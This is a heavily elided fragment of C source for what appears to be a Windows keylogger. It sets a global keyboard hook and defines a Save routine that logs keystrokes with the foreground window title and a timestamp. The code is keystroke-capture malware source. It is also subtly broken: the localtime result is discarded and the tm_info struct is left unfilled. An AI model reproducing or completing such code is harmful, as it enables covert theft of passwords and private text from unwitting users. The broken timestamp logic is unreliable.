...
// #define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else than globally
...
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		...
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kbdStruct.
...
int Save(int key_stroke)
{
	...
	if (foreground)
	{
		...
		{
		    strncpy(lastwindow, window_title, sizeof(lastwindow));
		    lastwindow[sizeof(lastwindow) - 1] = '\0';  // Ensure null-termination
		    // get time
		    struct tm tm_info;
		    time_t t = time(NULL);
		    localtime(&t);
